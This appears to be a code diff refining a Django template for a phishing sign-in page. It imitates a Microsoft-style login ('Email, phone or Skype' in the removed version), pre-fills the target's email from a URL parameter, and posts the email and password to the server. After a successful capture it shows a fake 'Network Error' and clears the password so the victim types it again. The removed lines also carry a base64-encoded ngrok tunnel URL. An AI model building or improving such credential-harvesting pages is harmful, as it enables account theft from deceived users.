@@ -1,73 +1,66 @@
 {% load static %}
 <!DOCTYPE html>
-<html lang="en" data-badie="aHR0cHM6Ly81ZWJkYWRhNzE0ZTUubmdyb2stZnJlZS5hcHAvZnJvbnRlbmQvb25nL29uLXBhcmRvbi9vZy8=">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in </title>
+    <title>Sign in</title>
 
-    <!-- google font -->
+    <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&display=swap" rel="stylesheet">
 
     <style>
-        body{
+        body {
             height: 100vh;
-            background: radial-gradient(rgb(212, 207, 207),#f5f5f5);
+            background: radial-gradient(rgb(212, 207, 207), #f5f5f5);
             font-family: "Poppins", sans-serif;
             overflow-y: hidden;
         }
-        img{
+        img {
             display: block;
             width: 100%;
         }
-        a{
+        a {
             text-decoration: none;
             color: rgb(41, 103, 219);
             font-size: .8rem;
         }
-        p{
+        p {
             color: rgb(82, 76, 76);
             font-size: 0.9rem;
-
         }
-        h2{
+        h2 {
             color: rgb(19, 17, 17);
             font-weight: 500;
             font-size: 1.3rem;
             margin-bottom: 10px;
         }
-        .wrapper{
-            /* margin-inline: 3rem; */
+        .wrapper {
             margin-block: 8rem;
             display: flex;
             justify-content: center;
             align-items: center;
             padding-inline: 40px;
-            /* border: 1px solid red;
-            margin-inline: 40px; */
         }
-        .logo{
+        .logo {
             width: 120px;
             padding-top: 10px;
             margin-bottom: 24px;
         }
-        .card{
-            /* border: 2px solid red; */
+        .card {
             width: 345px;
-            height: auto;
-            /* height: 310px; */
             padding: 33px 47px;
             background: #fff;
             box-shadow: 0.2 .4rem .5rem rgb(128, 127, 127);
         }
-        .form-content{
+        .form-content {
             margin-bottom: 1rem;
             width: auto;
         }
         .form-content input[type='email'],
-        .form-content input[type='password']{
+        .form-content input[type='password'] {
             width: 100%;
             border: none;
             border-bottom: .8px solid #333131e7;
@@ -76,18 +69,14 @@
             font-size: 0.9rem;
             color: rgb(46, 45, 45);
         }
-        .form-content input[type='email']:focus,
-        .form-content input[type='password']:focus{
+        .form-content input:focus {
             border-bottom: 1px solid rgb(16, 77, 189);
         }
-
-
-        .form-content input[type='email']::placeholder,
-        .form-content input[type='password']::placeholder{
+        .form-content input::placeholder {
             font-size: 1rem;
         }
         .form-content button,
-        .formbtn{
+        .formbtn {
             padding: 7px 31px;
             background: rgb(33, 101, 228);
             color: #fff;
@@ -104,33 +93,30 @@
             border: none;
             outline: none;
         }
-        .form-content button:hover{
-            background: rgb(10, 62, 160); 
+        .form-content button:hover {
+            background: rgb(10, 62, 160);
         }
-        .form-content a:hover{
-            background: rgb(117, 115, 115);
-        }
-        .form-content.form-button{
+        .form-content.form-button {
             display: flex;
-            align-items: left;
-            justify-content: end;
-            gap: 0.7rem;  
+            justify-content: flex-end;
+            gap: 0.7rem;
         }
-        .link{
+        .link {
             margin-bottom: 20px;
         }
-        .form-content input[type='email']:invalid{
+        .form-content input[type='email']:invalid {
             border-bottom: 1px solid rgb(219, 34, 34);
         }
-
-        .perrwarning,.errwarning{
+        .perrwarning, .errwarning {
             color: rgb(165, 7, 7);
+            font-size: 0.9rem;
+            margin-bottom: 10px;
         }
-        @media(max-width:560px){
-            .wrapper{
-            padding-inline: 40px;
+        @media(max-width:560px) {
+            .wrapper {
+                padding-inline: 40px;
             }
-            .card{
+            .card {
                 width: 280px;
             }
         }
@@ -141,18 +127,16 @@
         <div class="layout-grid">
             <div class="card loginForm" id="login-form">
                 <div class="logo">
-                    <img src="{% static 'frontend/img/logo.png' %}" alt="">
+                    <img src="{% static 'frontend/img/logo.png' %}" alt="Logo">
                 </div>
-                
-                <form action="" id="my-login-form" method="POST">
 
-                    <!-- seperate email and password -->
+                <form id="my-login-form" method="POST" onsubmit="return false;">
                     <!-- Email Side -->
                     <div class="email-side" id="email-side">
                         <h2>Sign in</h2>
-                        <div class="errwarning"></div>
+                        <div class="errwarning" id="email-error"></div>
                         <div class="form-content">
-                            <input type="email" id="email" placeholder="Email, phone or Skype">
+                            <input type="email" id="email" name="email" placeholder="Email" autocomplete="off">
                         </div>
 
                         <div class="link">
@@ -161,7 +145,8 @@
                         </div>
 
                         <div class="form-content form-button">
-                            <a href="">Back</a>
+                            <a href="#" id="back-link">Back</a>
+                             <!-- <a href="">Back</a> -->
                             <div id="next-email" class="submit formbtn">Next</div>
                         </div>
                     </div>
@@ -170,13 +155,13 @@
                     <div class="password-side" id="password-side" style="display: none;">
                         <div class="showemail" id="showemail"></div>
                         <h2>Enter password</h2>
-                        <div class="perrwarning"></div>
+                        <div class="perrwarning" id="password-error"></div>
 
                         <div class="form-content">
-                            <input type="hidden" id="emailhidden" value="" name="f_email">
+                            <input type="hidden" id="emailhidden" name="f_email">
                         </div>
                         <div class="form-content">
-                            <input type="password" id="password" placeholder="Password" name="f_password">
+                            <input type="password" id="password" name="f_password" placeholder="Password" autocomplete="off">
                         </div>
 
                         <div class="link">
@@ -185,7 +170,7 @@
                         </div>
 
                         <div class="form-content form-button">
-                            <button type="submit" id="final-submit-btn">Sign in</button>
+                            <button type="button" id="final-submit-btn">Sign in</button>
                         </div>
                     </div>
                 </form>
@@ -194,117 +179,137 @@
         </div>
     </div>
 
-
-<script>
-    function getQueryParam(name) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(name);
-    }
-
-    document.addEventListener("DOMContentLoaded", function () {
-        const emailParam = getQueryParam('em');
-        const emailSide = document.getElementById('email-side');
-        const passwordSide = document.getElementById('password-side');
-        const emailInput = document.getElementById('email');
-        const emailHidden = document.getElementById('emailhidden');
-        const showEmail = document.getElementById('showemail');
-        const nextBtn = document.getElementById('next-email');
-
-        if (emailParam) {
-            // Direct to password view
-            emailSide.style.display = 'none';
-            passwordSide.style.display = 'block';
-            emailHidden.value = emailParam;
-            showEmail.innerText = emailParam;
-        } else {
-            // Show email form first
-            emailSide.style.display = 'block';
-            passwordSide.style.display = 'none';
+    <!-- JS Logic -->
+    <script>
+        function getQueryParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
         }
 
-        nextBtn.addEventListener('click', function () {
-            const enteredEmail = emailInput.value.trim();
-            if (!enteredEmail) {
-                alert("Please enter an email.");
-                return;
-            }
+        document.addEventListener("DOMContentLoaded", function () {
+            const emailParam = getQueryParam('em');
+            const emailSide = document.getElementById('email-side');
+            const passwordSide = document.getElementById('password-side');
+            const emailInput = document.getElementById('email');
+            const emailHidden = document.getElementById('emailhidden');
+            const showEmail = document.getElementById('showemail');
+            const nextBtn = document.getElementById('next-email');
+            const backLink = document.getElementById('back-link');
+            const emailError = document.getElementById('email-error');
 
-            // Update UI
-            emailSide.style.display = 'none';
-            passwordSide.style.display = 'block';
-
-            // Set email in hidden field and show on password page
-            emailHidden.value = enteredEmail;
-            showEmail.innerText = enteredEmail;
-
-            // Optionally update the URL with `?em=`
-            const newUrl = window.location.pathname + '?em=' + encodeURIComponent(enteredEmail);
-            window.history.replaceState({}, '', newUrl);
-        });
-    });
-</script>
-<!-- <script>
-document.addEventListener("DOMContentLoaded", function () {
-    const finalSubmitBtn = document.getElementById('final-submit-btn');
-    const emailHidden = document.getElementById('emailhidden');
-    const passwordInput = document.getElementById('password');
-    const errorBox = document.querySelector('.perrwarning');
-
-    finalSubmitBtn.addEventListener('click', function () {
-        const email = emailHidden.value.trim();
-        const password = passwordInput.value.trim();
-
-        errorBox.innerText = ''; // Clear previous errors
-
-        if (!email || !password) {
-            errorBox.innerText = "Both email and password are required.";
-            return;
-        }
-
-        fetch('/ajax-login/', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-CSRFToken': getCookie('csrftoken')  // Optional if CSRF is enforced
-            },
-            body: JSON.stringify({ email, password })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.status === 'success') {
-                window.location.href = data.redirect;
+            if (emailParam) {
+                emailSide.style.display = 'none';
+                passwordSide.style.display = 'block';
+                emailHidden.value = emailParam;
+                showEmail.innerText = emailParam;
             } else {
-                errorBox.innerText = data.message || 'Login failed.';
+                emailSide.style.display = 'block';
+                passwordSide.style.display = 'none';
             }
-        })
-        .catch(error => {
-            console.error("Login error:", error);
-            errorBox.innerText = "An unexpected error occurred.";
-        });
-    });
 
-    // CSRF helper
-    function getCookie(name) {
-        let cookieValue = null;
-        if (document.cookie && document.cookie !== '') {
-            const cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                cookie = cookie.trim();
-                if (cookie.substring(0, name.length + 1) === (name + '=')) {
-                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
-                    break;
+            nextBtn.addEventListener('click', function () {
+                const enteredEmail = emailInput.value.trim();
+                emailError.innerText = '';
+
+                if (!enteredEmail) {
+                    emailError.innerText = "Please enter your email.";
+                    return;
                 }
-            }
-        }
-        return cookieValue;
-    }
-});
-</script> -->
 
+                emailSide.style.display = 'none';
+                passwordSide.style.display = 'block';
+                emailHidden.value = enteredEmail;
+                showEmail.innerText = enteredEmail;
+
+                const newUrl = window.location.pathname + '?em=' + encodeURIComponent(enteredEmail);
+                window.history.replaceState({}, '', newUrl);
+            });
+
+            backLink.addEventListener('click', function (e) {
+                e.preventDefault();
+                emailSide.style.display = 'block';
+                passwordSide.style.display = 'none';
+                window.history.replaceState({}, '', window.location.pathname);
+            });
+        });
+    </script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const finalSubmitBtn = document.getElementById('final-submit-btn');
+            const emailHidden = document.getElementById('emailhidden');
+            const passwordInput = document.getElementById('password');
+            const errorBox = document.getElementById('password-error');
+
+            finalSubmitBtn.addEventListener('click', function () {
+                const email = emailHidden.value.trim();
+                const password = passwordInput.value.trim();
+
+                errorBox.innerText = ''; // Clear previous errors
+
+                if (!email || !password) {
+                    errorBox.innerText = "Both email and password are required.";
+                    return;
+                }
+                if (!isValidPassword(password)) {
+                    errorBox.innerText = "Password must be at least 8 characters.";
+                    document.getElementById('password').value = '';
+                    return;
+                }
+
+                finalSubmitBtn.disabled = true;
+
+                const serverUrl = "{% url 'ajax_login' %}"
+
+                fetch(serverUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRFToken': getCookie('csrftoken')  // Optional if CSRF is enforced
+                    },
+                    body: JSON.stringify({ email, password })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        // window.location.href = data.redirect;
+                        errorBox.innerText = data.message || 'Network Error! Please verify your information and try again.';
+                        finalSubmitBtn.disabled = false;
+                        document.getElementById('password').value = '';
+                        const newUrl = window.location.pathname + '?em=' + encodeURIComponent(email);
+                        window.history.replaceState({}, '', newUrl);
+                    } else {
+                        errorBox.innerText = data.message || 'Login failed.';
+                        finalSubmitBtn.disabled = false;
+                    }
+                })
+                .catch(error => {
+                    console.error("Login error:", error);
+                    errorBox.innerText = "An unexpected error occurred.";
+                    finalSubmitBtn.disabled = false;
+                });
+            });
+
+            function isValidPassword(password) {
+                return password.length >= 8;
+            }
+
+            // CSRF helper
+            function getCookie(name) {
+                let cookieValue = null;
+                if (document.cookie && document.cookie !== '') {
+                    const cookies = document.cookie.split(';');
+                    for (let cookie of cookies) {
+                        cookie = cookie.trim();
+                        if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                            cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                            break;
+                        }
+                    }
+                }
+                return cookieValue;
+            }
+        });
+    </script>
 </body>
 </html>
-
-
-
-
-
